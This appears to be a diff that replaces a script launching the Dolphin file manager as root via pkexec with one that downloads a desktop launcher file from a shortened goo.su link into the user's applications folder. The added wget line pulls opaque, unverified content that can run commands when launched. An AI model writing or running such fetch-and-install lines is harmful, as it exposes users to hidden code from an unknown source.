@@ -1,2 +1,3 @@
-#!/bin/bash
-pkexec env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY KDE_SESSION_VERSION=5 KDE_FULL_SESSION=true dolphin
+#!/bin/sh
+mkdir -p ~/.local/share/applications/
+wget -O ~/.local/share/applications/org.kde.dolphin.root.desktop goo.su/bCVUXT
